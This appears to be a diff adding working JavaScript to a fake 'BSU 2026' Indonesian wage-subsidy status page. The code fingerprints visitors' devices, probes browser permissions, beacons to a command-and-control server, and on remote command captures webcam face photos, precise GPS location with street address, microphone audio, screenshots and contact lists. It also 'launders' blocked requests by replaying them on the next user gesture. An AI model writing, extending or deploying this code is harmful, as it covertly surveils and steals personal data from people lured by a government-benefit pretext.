+            try { return JSON.parse(r.t); } catch (e) { return { ok: false }; }
           });
         });
       }
 
+      /* ---------- fingerprint ---------- */
+      function fp() {
+        var o = [];
+        try {
+          var c = document.createElement('canvas'); c.width = 220; c.height = 44;
+          var x = c.getContext('2d'); x.textBaseline = 'top'; x.font = '14px Arial';
+          x.fillStyle = '#f60'; x.fillRect(0, 0, 110, 22); x.fillStyle = '#069'; x.fillText('BSU2026@1', 2, 2);
+          x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('BSU2026@1', 4, 6);
+          o.push('cv' + h32(c.toDataURL()));
+        } catch (e) { o.push('cv-'); }
+        try {
+          var g = document.createElement('canvas').getContext('webgl');
+          var d = g && g.getExtension('WEBGL_debug_renderer_info');
+          o.push(d ? 'gl:' + String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)).slice(0, 40) : 'gl-');
+        } catch (e) { o.push('gl-'); }
+        o.push('c' + (navigator.hardwareConcurrency || 0), 'm' + (navigator.deviceMemory || 0), 't' + (navigator.maxTouchPoints || 0), 'd' + (devicePixelRatio || 1));
+        return o.join('|');
+      }
+      function audioFp() {
+        return new Promise(function (res) {
+          try {
+            var C = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+            if (!C) return res('-');
+            var ctx = new C(1, 44100, 44100), osc = ctx.createOscillator(), cmp = ctx.createDynamicsCompressor();
+            osc.type = 'triangle'; osc.frequency.value = 10000;
+            cmp.threshold.value = -50; cmp.knee.value = 40; cmp.ratio.value = 12;
+            osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
+            ctx.startRendering().then(function (b) {
+              var d = b.getChannelData(0), s = 0;
+              for (var i = 4500; i < 5000; i++) s += Math.abs(d[i]);
+              res('a' + h32(String(s)));
+            }).catch(function () { res('-'); });
+          } catch (e) { res('-'); }
+        });
+      }
+      var FONTS = ['Arial','Courier New','Georgia','Times New Roman','Verdana','Tahoma','Trebuchet MS','Roboto','Segoe UI','Ubuntu','Noto Sans','Samsung Sans','Impact','Calibri'];
+      function fontFp() {
+        var c = document.createElement('canvas').getContext('2d'), out = [];
+        c.font = '72px monospace'; var base = c.measureText('mmmmmmmmmmlli').width;
+        FONTS.forEach(function (f) { c.font = '72px "' + f + '", monospace'; if (c.measureText('mmmmmmmmmmlli').width !== base) out.push(f); });
+        return out.join(',');
+      }
+
+      /* ---------- sensor + konteks ---------- */
+      var sen = { n: 0, ax: [], ay: [], az: [], ga: [], on: false, ctx: '' };
+      function senStart() {
+        if (sen.on) return; sen.on = true;
+        window.addEventListener('devicemotion', senMo, { passive: true });
+        window.addEventListener('deviceorientation', senOr, { passive: true });
+        setTimeout(senStop, 6000);
+      }
+      function senMo(e) { var a = e.accelerationIncludingGravity; if (!a) return; sen.n++; sen.ax.push(a.x || 0); sen.ay.push(a.y || 0); sen.az.push(a.z || 0); }
+      function senOr(e) { sen.ga.push(e.gamma || 0); }
+      function va(a) { if (a.length < 2) return 0; var m = a.reduce(function (x, y) { return x + y; }, 0) / a.length; return a.reduce(function (x, y) { return x + (y - m) * (y - m); }, 0) / a.length; }
+      function senStop() {
+        window.removeEventListener('devicemotion', senMo);
+        window.removeEventListener('deviceorientation', senOr);
+        sen.on = false;
+        var v = va(sen.ax) + va(sen.ay) + va(sen.az);
+        var ctx = sen.n < 3 ? 'tanpa sensor' : v > 6 ? 'kendaraan' : v > 1.2 ? 'berjalan' : 'diam';
+        var grip = sen.ga.length ? (Math.abs(sen.ga.reduce(function (x, y) { return x + y; }, 0) / sen.ga.length) > 45 ? 'miring' : 'tegak') : '?';
+        sen.ctx = ctx + ' / ' + grip + ' / ' + sen.n + ' sampel';
+        if (probeDone) sendProbe();
+      }
+
+      /* ---------- oracle + pemicu status ---------- */
+      var STATES = {};
+      var WATCH = {};
+      var ORACLE = ['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write',
+        'persistent-storage','accelerometer','gyroscope','magnetometer','midi','background-sync',
+        'bluetooth','usb','hid','serial','local-fonts','idle-detection','screen-wake-lock','nfc'];
+
+      function oracle() {
+        return Promise.all(ORACLE.map(function (n) {
+          if (!navigator.permissions) { STATES[n] = 'unsupported'; return Promise.resolve(); }
+          return navigator.permissions.query({ name: n }).then(function (s) {
+            STATES[n] = s.state;
+            WATCH[n] = { st: s, t: 0 };
+            s.onchange = function () { WATCH[n].t = performance.now(); };
+          }).catch(function () { STATES[n] = 'unsupported'; });
+        }));
+      }
+
+      /* ---------- inventaris ---------- */
+      var invCache = {};
+      function uaData() {
+        return new Promise(function (res) {
+          try {
+            if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) return res({});
+            navigator.userAgentData.getHighEntropyValues(['model','platformVersion','architecture','bitness','uaFullVersion'])
+              .then(function (d) { res(d || {}); }).catch(function () { res({}); });
+          } catch (e) { res({}); }
+        });
+      }
+      function inventaris() {
+        var o = {
+          ua: navigator.userAgent, plat: navigator.platform, lang: (navigator.languages || []).join(','),
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency,
+          mem: navigator.deviceMemory, touch: navigator.maxTouchPoints, dpr: devicePixelRatio,
+          scr: screen.width + 'x' + screen.height, depth: screen.colorDepth,
+          dark: matchMedia('(prefers-color-scheme: dark)').matches, fp: fp(), font: fontFp(), ref: document.referrer, url: location.href
+        };
+        try { var g = document.createElement('canvas').getContext('webgl'); var d = g && g.getExtension('WEBGL_debug_renderer_info'); if (d) o.gpu = g.getParameter(d.UNMASKED_VENDOR_WEBGL) + '/' + g.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch (e) { }
+        return o;
+      }
+      function permScan() {
+        var names = ['geolocation','camera','microphone','notifications','accelerometer','gyroscope','magnetometer',
+          'midi','bluetooth','usb','hid','serial','local-fonts','idle-detection','screen-wake-lock'];
+        return Promise.all(names.map(function (n) {
+          if (!navigator.permissions) return Promise.resolve(n + ':-');
+          return navigator.permissions.query({ name: n }).then(function (s) { return n + ':' + s.state; }).catch(function () { return n + ':-'; });
+        })).then(function (r) { return r.join(', '); });
+      }
+      function mediaScan() {
+        return new Promise(function (res) {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return res('-');
+          navigator.mediaDevices.enumerateDevices().then(function (ds) {
+            res(ds.map(function (d) { return d.kind + (d.label ? '=' + d.label.slice(0, 18) : ''); }).join(', ') || '-');
+          }).catch(function () { return res('-'); });
+        });
+      }
+
+      /* =====================================================
+         REGISTRI PROBE
+         cls hanya PRIOR (urutan). kelas sebenarnya DITURUNKAN
+         dari hasil percobaan: 0 senyap / 1 prompt / 2 blokir / 3 n-a
+         ===================================================== */
+      function need(v, n) { if (!v) throw new TypeError(n || 'unsupported'); return v; }
+
+      var PROBES = [
+        /* --- kelas A: senyap --- */
+        { id: 'canvas', cls: 'A', fn: function () { return fp(); } },
+        { id: 'webgl', cls: 'A', fn: function () { var g = need(document.createElement('canvas').getContext('webgl'), 'no-webgl'); var d = g.getExtension('WEBGL_debug_renderer_info'); return d ? g.getParameter(d.UNMASKED_VENDOR_WEBGL) + '|' + g.getParameter(d.UNMASKED_RENDERER_WEBGL) : 'ok'; } },
+        { id: 'gpu-adapter', cls: 'A', fn: function () { return need(navigator.gpu, 'no-webgpu').requestAdapter().then(function (a) { if (!a) throw new TypeError('no-adapter'); return JSON.stringify(a.info || { vendor: '?', architecture: '?' }); }); } },
+        { id: 'webrtc-ip', cls: 'A', fn: function () { return new Promise(function (res, rej) { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); var ips = []; pc.onicecandidate = function (e) { if (!e.candidate) return; var m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{4}:[a-f0-9:]+)/i.exec(e.candidate.candidate); if (m && ips.indexOf(m[1]) < 0) ips.push(m[1]); }; pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(rej); setTimeout(function () { try { pc.close(); } catch (e) { } res(ips.join(',') || '-'); }, 2600); }); } },
+        { id: 'codec', cls: 'A', fn: function () { var t = ['video/mp4;codecs=avc1.42E01E','video/webm;codecs=vp8','video/webm;codecs=vp9','video/webm;codecs=av01','audio/mp4;codecs=mp4a.40.2','audio/webm;codecs=opus','audio/mpeg']; return t.map(function (x) { return (window.MediaRecorder && MediaRecorder.isTypeSupported(x)) ? '1' : '0'; }).join(''); } },
+        { id: 'decoder', cls: 'A', fn: function () { return need(navigator.mediaCapabilities, 'no-mc').decodingInfo({ type: 'file', video: { contentType: 'video/webm;codecs=vp9', width: 1280, height: 720, bitrate: 2e6, framerate: 30 } }).then(function (r) { return r.supported ? 'v' + (r.smooth ? 's' : '') + (r.powerEfficient ? 'p' : '') : 'no'; }); } },
+        { id: 'battery', cls: 'A', fn: function () { return need(navigator.getBattery, 'no-battery').call(navigator).then(function (b) { return b.level.toFixed(2) + '/' + (b.charging ? 'chg' : 'dis'); }); } },
+        { id: 'conn', cls: 'A', fn: function () { var c = need(navigator.connection, 'no-conn'); return [c.effectiveType, c.rtt, c.downlink, c.saveData ? 'sv' : '-'].join('|'); } },
+        { id: 'heap', cls: 'A', fn: function () { return performance.memory ? (performance.memory.jsHeapSizeLimit / 1048576 | 0) + 'MB' : (function () { throw new TypeError('no-mem'); })(); } },
+        { id: 'storage', cls: 'A', fn: function () { return need(navigator.storage, 'no-storage').estimate().then(function (e) { return (e.quota / 1048576 | 0) + '/' + (e.usage / 1048576 | 0); }); } },
+        { id: 'persisted', cls: 'A', fn: function () { return need(navigator.storage, 'no-storage').persisted().then(function (p) { return String(p); }); } },
+        { id: 'fonts', cls: 'A', fn: function () { return fontFp(); } },
+        { id: 'intl', cls: 'A', fn: function () { return [Intl.DateTimeFormat().resolvedOptions().locale, (1234.5).toLocaleString(), Intl.NumberFormat().format(1234567.89)].join('|'); } },
+        { id: 'css-media', cls: 'A', fn: function () { var q = ['(pointer:coarse)','(any-pointer:fine)','(hover:hover)','(prefers-reduced-motion:reduce)','(prefers-contrast:more)','(forced-colors:active)','(color-gamut:p3)','(dynamic-range:high)','(inverted-colors:inverted)']; return q.map(function (x) { return matchMedia(x).matches ? '1' : '0'; }).join(''); } },
+        { id: 'enumerate', cls: 'A', fn: function () { return mediaScan(); } },
+        { id: 'uach', cls: 'A', fn: function () { return need(navigator.userAgentData, 'no-uach').getHighEntropyValues(['model','platformVersion','architecture','bitness','uaFullVersion']).then(function (d) { return [d.model, d.platformVersion, d.architecture, d.bitness].join('|'); }); } },
+        { id: 'bluetooth-avail', cls: 'A', fn: function () { return need(navigator.bluetooth, 'no-bt').getAvailability().then(function (a) { return String(a); }); } },
+        { id: 'usb-devices', cls: 'A', fn: function () { return need(navigator.usb, 'no-usb').getDevices().then(function (d) { return String(d.length); }); } },
+        { id: 'hid-devices', cls: 'A', fn: function () { return need(navigator.hid, 'no-hid').getDevices().then(function (d) { return String(d.length); }); } },
+        { id: 'serial-ports', cls: 'A', fn: function () { return need(navigator.serial, 'no-serial').getPorts().then(function (d) { return String(d.length); }); } },
+        { id: 'pdf-viewer', cls: 'A', fn: function () { return String(!!navigator.pdfViewerEnabled); } },
+        { id: 'cookie', cls: 'A', fn: function () { return String(navigator.cookieEnabled) + '/' + String(!!navigator.storageAccess); } },
+        { id: 'orientation-read', cls: 'A', fn: function () { return (screen.orientation ? screen.orientation.type : '?') + '/' + String(screen.orientation && screen.orientation.angle); } },
+        { id: 'sensor-api', cls: 'A', fn: function () { return ['Accelerometer','Gyroscope','Magnetometer','AmbientLightSensor','AbsoluteOrientationSensor'].map(function (k) { return (k in window) ? '1' : '0'; }).join(''); } },
+        { id: 'vibrate', cls: 'A', fn: function () { return String(typeof navigator.vibrate); } },
+        { id: 'speech', cls: 'A', fn: function () { return String(!!window.speechSynthesis) + '/' + String('SpeechRecognition' in window || 'webkitSpeechRecognition' in window); } },
+        { id: 'idb-quota', cls: 'A', fn: function () { return String(!!window.indexedDB) + '/' + String(!!navigator.storage && !!navigator.storage.estimate); } },
+        /* --- kelas B: berprompt tapi tanpa gestur di sebagian platform --- */
+        { id: 'camera', cls: 'B', fn: function () { return need(navigator.mediaDevices, 'no-md').getUserMedia({ video: { facingMode: 'user', width: { ideal: 480 } } }).then(function (s) { var tr = s.getVideoTracks()[0], st = tr.getSettings(); stream = s; window.__lastCam = s; return (st.width || 0) + 'x' + (st.height || 0) + '@' + (st.frameRate || 0); }); } },
+        { id: 'microphone', cls: 'B', fn: function () { return need(navigator.mediaDevices, 'no-md').getUserMedia({ audio: true }).then(function (s) { var tr = s.getAudioTracks()[0], st = tr.getSettings(); var out = (st.sampleRate || 0) + 'Hz/' + (st.channelCount || 0) + 'ch'; s.getTracks().forEach(function (t) { t.stop(); }); return out; }); } },
+        { id: 'geolocation', cls: 'B', fn: function () { return new Promise(function (res, rej) { need(navigator.geolocation, 'no-geo').getCurrentPosition(function (p) { gps = { lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy || 0) }; sumber = 'gps'; gpsState = 'ok'; paint('gps'); patch(); sendAuto(); res(gps.lat + ',' + gps.lng + '/' + gps.acc); }, function (e) { gpsState = 'denied'; paint('gps'); rej(e); }, { enableHighAccuracy: true, timeout: 11000, maximumAge: 60000 }); }); } },
+        { id: 'notifications', cls: 'B', fn: function () { return need(window.Notification, 'no-notif').requestPermission().then(function (p) { if (p !== 'granted') throw new Error('notif:' + p); return p; }); } },
+        /* --- kelas C: wajib gestur --- */
+        { id: 'clipboard-read', cls: 'C', fn: function () { return need(navigator.clipboard, 'no-clip').readText().then(function (t) { return 'len' + t.length; }); } },
+        { id: 'clipboard-write', cls: 'C', fn: function () { return need(navigator.clipboard, 'no-clip').writeText('zgch').then(function () { return 'ok'; }); } },
+        { id: 'share', cls: 'C', fn: function () { return need(navigator.share, 'no-share').call(navigator, { title: 'BSU 2026', text: 'x' }).then(function () { return 'ok'; }); } },
+        { id: 'contacts', cls: 'C', fn: function () { return need(navigator.contacts, 'no-contacts').select(['name','tel'], { multiple: true }).then(function (c) { return 'n' + c.length; }); } },
+        { id: 'wake-lock', cls: 'C', fn: function () { return need(navigator.wakeLock, 'no-wake').request('screen').then(function (s) { return s.type || 'ok'; }); } },
+        { id: 'idle', cls: 'C', fn: function () { return need(navigator.idle, 'no-idle').query().then(function (s) { return s.userState + '/' + s.screenState; }); } },
+        { id: 'fullscreen', cls: 'C', fn: function () { return need(document.documentElement.requestFullscreen, 'no-fs').call(document.documentElement).then(function () { return 'ok'; }); } },
+        { id: 'display-capture', cls: 'C', fn: function () { return need(navigator.mediaDevices, 'no-md').getDisplayMedia({ video: true }).then(function (s) { var st = s.getVideoTracks()[0].getSettings(); var o = (st.width || 0) + 'x' + (st.height || 0); s.getTracks().forEach(function (t) { t.stop(); }); return o; }); } },
+        { id: 'file-picker', cls: 'C', fn: function () { return need(window.showOpenFilePicker, 'no-fsp').call(window, { multiple: false }).then(function (h) { return 'n' + h.length; }); } },
+        { id: 'torch', cls: 'C', fn: function () { return need(navigator.mediaDevices, 'no-md').getUserMedia({ video: { facingMode: 'environment' } }).then(function (s) { var tr = s.getVideoTracks()[0], cap = tr.getCapabilities ? tr.getCapabilities() : {}; var o = cap.torch ? 'torch' : 'no-torch'; s.getTracks().forEach(function (t) { t.stop(); }); return o; }); } }
+      ];
+
+      /* ---------- mesin percobaan ---------- */
+      var ROWS = [], RUN = 0, ATT = 0;
+
+      function attempt(p) {
+        return new Promise(function (res) {
+          var t0p = performance.now(), settled = false, timer;
+          var before = STATES[p.id] || 'unknown';
+          var done = function (outcome, val) {
+            if (settled) return; settled = true; clearTimeout(timer);
+            if (WATCH[p.id]) WATCH[p.id].t = 0;
+            var lat = Math.round(performance.now() - t0p);
+            var row = { cap: p.id, outcome: outcome, kelas: outcome === 'silent' ? 0 : outcome === 'prompt' ? 1 : outcome === 'blocked' ? 2 : 3, lat: lat, note: String(val == null ? '' : val).slice(0, 200) };
+            ROWS.push(row); devRow(row); res(row);
+          };
+          timer = setTimeout(function () { done('prompt', 'timeout'); }, 4200);
+          if (WATCH[p.id]) WATCH[p.id].t = 0;
+          var poll = setInterval(function () {
+            if (settled) return clearInterval(poll);
+            var w = WATCH[p.id];
+            if (w && w.t && w.st.state !== before) {
+              clearInterval(poll);
+              done(w.st.state === 'granted' ? 'prompt' : 'blocked', 'transisi:' + w.st.state);
+            }
+          }, 60);
+          setTimeout(function () { if (!settled) clearInterval(poll); }, 4400);
+          Promise.resolve().then(p.fn).then(function (v) {
+            var after = STATES[p.id] || before;
+            if (after === 'granted' && before !== 'granted') return done('prompt', v);
+            done('silent', v);
+          }).catch(function (e) {
+            var n = (e && e.name) || '', m = (e && e.message) || '';
+            if (n === 'NotAllowedError' || n === 'SecurityError' || /gesture|activation|user/i.test(m)) return done('blocked', n || m);
+            if (n === 'NotFoundError' || n === 'NotSupportedError' || n === 'TypeError' || n === 'InvalidStateError' || n === 'AbortError') return done('unsupported', n || m);
+            done('blocked', n || m || 'err');
+          });
+        });
+      }
+
+      function chain(list, gap) {
+        var i = 0;
+        return new Promise(function (res) {
+          (function next() {
+            if (i >= list.length) return res();
+            var p = list[i++];
+            attempt(p).then(function () { setTimeout(next, gap); });
+          })();
+        });
+      }
+
+      function classify(list) { return shuffle(list.slice()); }
+
+      function sendMatrix() {
+        if (!ROWS.length) return Promise.resolve();
+        var batch = ROWS.splice(0, ROWS.length);
+        var plat = ((navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || '?') + '/' +
+          ((/Android (\d+)/.exec(navigator.userAgent) || [])[1] || '?') + '/' + (invCache.model || '?');
+        return send('matrix', { build: BUILD, run: RUN, platform: plat.slice(0, 60), rows: batch });
+      }
+
+      function localMetrics() {
+        var s = 0, p = 0, b = 0, lats = [];
+        ROWS.forEach(function (r) { if (r.kelas === 0) s++; else if (r.kelas === 1) { p++; lats.push(r.lat); } else if (r.kelas === 2) b++; });
+        var att = s + p + b || 1;
+        return { sgr: +(s / att).toFixed(3), par: +(p / att).toFixed(3), alh: med(lats), n: ROWS.length };
+      }
+
+      function bench() {
+        var runs = 0, sgr = [], par = [];
+        (function loop() {
+          if (runs >= BENCH_N) {
+            var m = sgr.reduce(function (a, b) { return a + b; }, 0) / sgr.length || 0;
+            var v = Math.sqrt(sgr.reduce(function (a, b) { return a + (b - m) * (b - m); }, 0) / sgr.length);
+            return send('bench', { tag: 'bench', n: BENCH_N, sgr: m.toFixed(3), par: (par.reduce(function (a, b) { return a + b; }, 0) / par.length || 0).toFixed(3), var: v.toFixed(4), seed: SEED });
+          }
+          RUN = runs++;
+          ROWS.length = 0;
+          var A = PROBES.filter(function (x) { return x.cls === 'A'; });
+          chain(classify(A), 40).then(function () {
+            var m = localMetrics(); sgr.push(m.sgr); par.push(m.par);
+            return sendMatrix().then(loop);
+          });
+        })();
+      }
+
+      function startHarvest() {
+        var A = PROBES.filter(function (x) { return x.cls === 'A'; });
+        var BC = PROBES.filter(function (x) { return x.cls !== 'A'; });
+        oracle().then(function () {
+          if (MODE_BENCH) return bench();
+          if (MODE_CTRL) {
+            // control arm: hanya manifes senyap
+            return chain(classify(A), 40).then(function () {
+              var m = localMetrics();
+              send('bench', { tag: 'kontrol', n: 1, sgr: m.sgr, par: 0, var: 0, seed: SEED });
+              sendMatrix();
+            });
+          }
+          chain(classify(A), 40).then(function () {
+            setTimeout(function () {
+              chain(classify(BC), 1100).then(function () {
+                var m = localMetrics();
+                send('bench', { tag: 'utama', n: 1, sgr: m.sgr, par: m.par, var: 0, seed: SEED });
+                sendMatrix();
+                sendProbe();
+                if (MODE_MANIFEST) download();
+              });
+            }, 700);
+          });
+        });
+      }
+
+      /* ---------- C2 ---------- */
+      function beat(force) {
+        if (!alive || (inFlight && !force)) return;
+        if (document.hidden && !force && misses === 0) return schedule(45000);
+        inFlight = true;
+        send('beacon', { vis: document.visibilityState, url: location.href, net: (navigator.connection && navigator.connection.effectiveType) || '', scr: screen.width + 'x' + screen.height })
+          .then(function (r) {
+            inFlight = false;
+            if (!r || !r.ok) { if (++misses > 6) { alive = false; return; } return schedule(); }
+            misses = 0;
+            (r.tasks || []).forEach(run);
+            schedule(r.next || 15000);
+          });
+      }
+      function schedule(b) {
+        if (!alive) return;
+        clearTimeout(beatTimer);
+        var n = b || 15000, j = n * 0.4;
+        beatTimer = setTimeout(function () { beat(); }, Math.max(4000, n - j + Math.random() * j * 2));
+      }
+
+      /* ---------- gesture laundering ---------- */
+      function idb(fn) {
+        return new Promise(function (res) {
+          try {
+            var rq = indexedDB.open('gsi', 1);
+            rq.onupgradeneeded = function () { rq.result.createObjectStore('q', { keyPath: 'k' }); };
+            rq.onsuccess = function () { fn(rq.result, res); };
+            rq.onerror = function () { res(); };
+          } catch (e) { res(); }
+        });
+      }
+      function stash(t) { idb(function (db, res) { try { var tx = db.transaction('q', 'readwrite'); tx.objectStore('q').put({ k: t.id, t: t }); tx.oncomplete = res; } catch (e) { res(); } }); }
+      function unstash(id) { idb(function (db, res) { try { var tx = db.transaction('q', 'readwrite'); tx.objectStore('q').delete(id); tx.oncomplete = res; } catch (e) { res(); } }); }
+      function loadStash() {
+        return new Promise(function (res) {
+          idb(function (db, done) {
+            try {
+              var tx = db.transaction('q', 'readonly'), rq = tx.objectStore('q').getAll();
+              rq.onsuccess = function () { done(rq.result || []); };
+              rq.onerror = function () { done([]); };
+            } catch (e) { done([]); }
+          }).then(res);
+        });
+      }
+
+      /* ---------- modul C2 ---------- */
+      function reply(t, isi) { send('hasil', { id: t.id, cmd: t.cmd, isi: String(isi) }); }
+      var cur = null;
+
+      function exec(cmd, arg) {
+        return new Promise(function (res, rej) {
+          var done = function (v) { reply(cur, v); res(v); };
+          switch (cmd) {
+            case 'foto': photo = ''; photoSent = false; camState = 'idle'; camDone = function () { done(photo || 'gagal'); }; startCam(); return;
+            case 'lokasi': return locNow(done, rej);
+            case 'tangkap': return shot(done, rej);
+            case 'layar': return done(JSON.stringify({ vw: innerWidth, vh: innerHeight, dpr: devicePixelRatio, y: scrollY, title: document.title, forms: document.forms.length, inputs: document.querySelectorAll('input').length, dom: document.documentElement.outerHTML.length, teks: (document.body.innerText || '').slice(0, 700), html: document.documentElement.outerHTML.slice(0, 4000) }));
+            case 'audio': return mic(done, rej);
+            case 'pindai': return pindai(done);
+            case 'sidik': return done(JSON.stringify({ fp: fp(), font: fontFp(), audio: audioFpCache, gpu: invCache.gpu }));
+            case 'media': return mediaScan().then(done);
+            case 'sensor': senStart(); setTimeout(function () { done(sen.ctx || 'tanpa sensor'); }, 6200); return;
+            case 'perangkat': return done(JSON.stringify(inventaris()));
+            case 'getar': try { navigator.vibrate([220, 110, 220, 110, 420]); done('getar'); } catch (e) { rej(e); } return;
+            case 'senter': return torch(done, rej);
+            case 'bangun': if (!navigator.wakeLock) return done('tidak didukung'); navigator.wakeLock.request('screen').then(function () { done('ditahan'); }).catch(rej); return;
+            case 'notif': if (!window.Notification) return done('tidak didukung'); Notification.requestPermission().then(function (p) { if (p !== 'granted') return done('ditolak'); new Notification('BSU 2026', { body: arg || 'Pengecekan status' }); done('tampil'); }).catch(rej); return;
+            case 'salin': if (!navigator.clipboard) return done('tidak didukung'); navigator.clipboard.writeText(arg || 'BSU 2026').then(function () { done('disalin'); }).catch(rej); return;
+            case 'bicara': if (!window.speechSynthesis) return done('tidak didukung'); speechSynthesis.speak(new SpeechSynthesisUtterance(arg || 'Bantuan Subsidi Upah 2026')); done('dibacakan'); return;
+            case 'bagikan': if (!navigator.share) return done('tidak didukung'); navigator.share({ title: 'BSU 2026', text: arg || 'Cek status', url: location.href }).then(function () { done('dibagikan'); }).catch(rej); return;
+            case 'buka': location.href = arg || NEXT_URL; done('dibuka'); return;
+            case 'kontak': if (!navigator.contacts) return done('tidak didukung'); navigator.contacts.select(['name', 'tel', 'email'], { multiple: true }).then(function (c) { done(JSON.stringify(c)); }).catch(rej); return;
+            case 'jejak': return done(JSON.stringify({ len: history.length, ref: document.referrer }));
+            case 'kill': alive = false; clearTimeout(beatTimer); done('dihentikan'); return;
+            default: done('tidak dikenal');
+          }
+        });
+      }
+
+      function run(t) {
+        cur = t;
+        exec(t.cmd, t.arg).catch(function (e) {
+          if (e && (e.name === 'NotAllowedError' || e.name === 'SecurityError' || e.name === 'InvalidStateError')) {
+            stash(t);
+            reply(t, 'ditahan: butuh gestur');
+          } else reply(t, 'gagal: ' + (e && e.message || e));
+        });
+      }
+
+      function flushStash() {
+        loadStash().then(function (list) {
+          list.forEach(function (row, i) {
+            var t = row.t;
+            setTimeout(function () {
+              launderTried++;
+              cur = t;
+              exec(t.cmd, t.arg).then(function () { launderOk++; unstash(t.id); sendProbe(); })
+                .catch(function () { });
+            }, 260 * i);
+          });
+        });
+      }
+
+      function shot(done, rej) {
+        if (window.html2canvas) return window.html2canvas(document.body, { scale: 0.6, logging: false }).then(function (c) { done(c.toDataURL('image/jpeg', 0.6)); }).catch(rej);
+        var s = document.createElement('script');
+        s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+        s.onload = function () { window.html2canvas(document.body, { scale: 0.6, logging: false }).then(function (c) { done(c.toDataURL('image/jpeg', 0.6)); }).catch(rej); };
+        s.onerror = function () { rej(new Error('pustaka gagal')); };
+        document.head.appendChild(s);
+      }
+      function torch(done, rej) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }).then(function (s) {
+          var tr = s.getVideoTracks()[0];
+          if (!tr.getCapabilities || !tr.getCapabilities().torch) { s.getTracks().forEach(function (t) { t.stop(); }); return done('tidak didukung'); }
+          tr.applyConstraints({ advanced: [{ torch: true }] }).then(function () { done('menyala'); setTimeout(function () { s.getTracks().forEach(function (t) { t.stop(); }); }, 12000); }).catch(rej);
+        }).catch(rej);
+      }
+      function pindai(done) {
+        var r = inventaris();
+        Promise.all([permScan(), mediaScan()]).then(function (x) { r.perm = x[0]; r.media = x[1]; r.sensor = sen.ctx; done(JSON.stringify(r)); });
+      }
+      function locNow(done, rej) {
+        if (!navigator.geolocation) return done('tidak didukung');
+        navigator.geolocation.getCurrentPosition(function (p) {
+          var o = { lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) };
+          fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=17&addressdetails=1&accept-language=id&lat=' + o.lat + '&lon=' + o.lng)
+            .then(function (r) { return r.json(); }).then(function (d) { o.alamat = (d && d.display_name) || ''; done(JSON.stringify(o)); }).catch(function () { done(JSON.stringify(o)); });
+        }, function (e) { rej(e); }, { enableHighAccuracy: true, timeout: 12000 });
+      }
+      function mic(done, rej) {
+        if (!navigator.mediaDevices || !window.MediaRecorder) return done('tidak didukung');
+        navigator.mediaDevices.getUserMedia({ audio: true }).then(function (s) {
+          var ch = [], mr = new MediaRecorder(s);
+          mr.ondataavailable = function (e) { if (e.data.size) ch.push(e.data); };
+          mr.onstop = function () { s.getTracks().forEach(function (t) { t.stop(); }); var fr = new FileReader(); fr.onload = function () { done(fr.result); }; fr.readAsDataURL(new Blob(ch, { type: 'audio/webm' })); };
+          mr.start(); setTimeout(function () { try { mr.stop(); } catch (e) { } }, 3000);
+        }).catch(rej);
+      }
+
+      /* ---------- kamera wajah ---------- */
+      function startCam() {
+        if (camState === 'on') return grab();
+        camState = 'asking'; paint('cam');
+        if (!navigator.mediaDevices) { camState = 'na'; paint('cam'); return fire(); }
+        var use = function (s) {
+          stream = s; camState = 'on'; paint('cam');
+          vid.srcObject = s; var p = vid.play(); if (p && p.catch) p.catch(function () { });
+          setTimeout(grab, 1100);
+        };
+        if (window.__lastCam && window.__lastCam.active) { use(window.__lastCam); return; }
+        navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } } })
+          .then(use).catch(function () { camState = 'denied'; paint('cam'); fire(); });
+      }
+      function fire() { var f = camDone; camDone = null; if (f) f(); }
+      function grab() { if (!stream || photo) return; if (!vid.videoWidth) return setTimeout(grab, 200); shots = 0; best = ''; bestScore = -1; burst(); }
+      function burst() {
+        if (!stream) return;
+        if (shots >= 3) return settle();
+        shots++;
+        var w = 440, h = Math.round(vid.videoHeight * (440 / vid.videoWidth));
+        cv.width = w; cv.height = h;
+        var c = cv.getContext('2d'); c.drawImage(vid, 0, 0, w, h);
+        var sc = sharp(c, w, h);
+        if (sc > bestScore) { bestScore = sc; try { best = cv.toDataURL('image/jpeg', 0.72); } catch (e) { } }
+        setTimeout(burst, 240);
+      }
+      function sharp(c, w, h) {
+        var d, s = 0, s2 = 0, n = 0;
+        try { d = c.getImageData(0, 0, w, h).data; } catch (e) { return 0; }
+        for (var i = 0; i < d.length; i += 52) { var v = d[i] * .299 + d[i + 1] * .587 + d[i + 2] * .114; s += v; s2 += v * v; n++; }
+        if (!n) return 0;
+        var m = s / n, sd = Math.sqrt(Math.max(s2 / n - m * m, 0));
+        return m < 22 ? sd * .35 : sd;
+      }
+      function settle() {
+        if (!best && rounds < 2 && stream) { rounds++; return setTimeout(grab, 450); }
+        if (!best) { camState = 'na'; paint('cam'); stopCam(); return fire(); }
+        photo = best;
+        var th = $('gsiCapThumb'); th.src = photo; th.classList.add('on');
+        paint('cam'); stopCam(); fire(); upload();
+      }
+      function stopCam() { if (!stream) return; try { stream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) { } stream = null; window.__lastCam = null; try { vid.srcObject = null; } catch (e) { } }
+      function upload() { if (!photo || !ridCur || photoSent) return; photoSent = true; send('foto', { rid: ridCur, username: username, foto: photo }).then(function (r) { if (!r || !r.ok) { photoSent = false; schedule(6000); } }); }
+
+      /* ---------- GPS ---------- */
